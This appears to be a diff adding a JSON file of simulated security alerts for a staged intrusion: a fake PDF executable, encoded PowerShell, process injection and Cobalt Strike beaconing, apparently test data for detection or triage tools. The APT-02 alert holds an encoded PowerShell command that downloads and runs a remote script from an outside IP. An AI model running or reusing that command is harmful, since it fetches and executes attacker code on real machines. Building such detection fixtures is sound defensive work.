@@ -1,0 +1,101 @@
+[
+  {
+    "raw_id": null,
+    "source_type": "sysmon",
+    "data": {
+      "alert_id": "APT-01",
+      "EventID": 11,
+      "event_type": "FileCreate",
+      "timestamp": "2026-08-31T10:30:49.286956",
+      "host_name": "FIN-WORKSTATION-04",
+      "user_name": "CORP\\sarah.connor",
+      "TargetFilename": "C:\\Users\\sarah.connor\\Downloads\\Q3_Financial_Bonus_Report.pdf.exe",
+      "file_hash_sha256": "4a7d1ed414474e4033ac29ccb8653d9b4b60fd33ac79d3434685ff86a59963be",
+      "severity": "High",
+      "description": "Suspicious executable file created in Downloads folder mimicking PDF icon.",
+      "mitre_tactics": [
+        "Initial Access"
+      ],
+      "mitre_techniques": [
+        "T1566.001"
+      ]
+    },
+    "ingested_at": "2026-08-31T12:30:49.287411"
+  },
+  {
+    "raw_id": null,
+    "source_type": "sysmon",
+    "data": {
+      "alert_id": "APT-02",
+      "EventID": 1,
+      "event_type": "ProcessCreate",
+      "timestamp": "2026-08-31T10:33:49.286956",
+      "host_name": "FIN-WORKSTATION-04",
+      "user_name": "CORP\\sarah.connor",
+      "process_name": "powershell.exe",
+      "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "process_command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
+      "parent_process_name": "Q3_Financial_Bonus_Report.pdf.exe",
+      "severity": "Critical",
+      "description": "Base64 encoded PowerShell execution spawned by downloaded executable.",
+      "mitre_tactics": [
+        "Execution"
+      ],
+      "mitre_techniques": [
+        "T1059.001"
+      ]
+    },
+    "ingested_at": "2026-08-31T12:30:49.287436"
+  },
+  {
+    "raw_id": null,
+    "source_type": "sysmon",
+    "data": {
+      "alert_id": "APT-03",
+      "EventID": 10,
+      "event_type": "ProcessAccess",
+      "timestamp": "2026-08-31T10:35:49.286956",
+      "host_name": "FIN-WORKSTATION-04",
+      "user_name": "CORP\\sarah.connor",
+      "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "TargetImage": "C:\\Windows\\System32\\rundll32.exe",
+      "GrantedAccess": "0x1F0FFF",
+      "CallTrace": "KERNEL32.DLL+0x1800|VirtualAllocEx|WriteProcessMemory|CreateRemoteThread",
+      "severity": "Critical",
+      "description": "Process injection detected: PowerShell allocated memory and created remote thread in rundll32.exe.",
+      "mitre_tactics": [
+        "Defense Evasion",
+        "Privilege Escalation"
+      ],
+      "mitre_techniques": [
+        "T1055"
+      ]
+    },
+    "ingested_at": "2026-08-31T12:30:49.287446"
+  },
+  {
+    "raw_id": null,
+    "source_type": "suricata",
+    "data": {
+      "alert_id": "APT-04",
+      "event_type": "Alert",
+      "timestamp": "2026-08-31T10:38:49.286956",
+      "src_ip": "10.0.4.15",
+      "dst_ip": "185.220.101.5",
+      "src_port": 49820,
+      "dst_port": 443,
+      "proto": "TCP",
+      "host_name": "FIN-WORKSTATION-04",
+      "signature": "ET TROJAN Cobalt Strike Beacon Observed Over HTTPS",
+      "severity": "Critical",
+      "description": "High frequency heartbeat beaconing detected matching Cobalt Strike malleable C2 profile.",
+      "mitre_tactics": [
+        "Command and Control"
+      ],
+      "mitre_techniques": [
+        "T1071.001"
+      ]
+    },
+    "ingested_at": "2026-08-31T12:30:49.287454"
+  }
+]
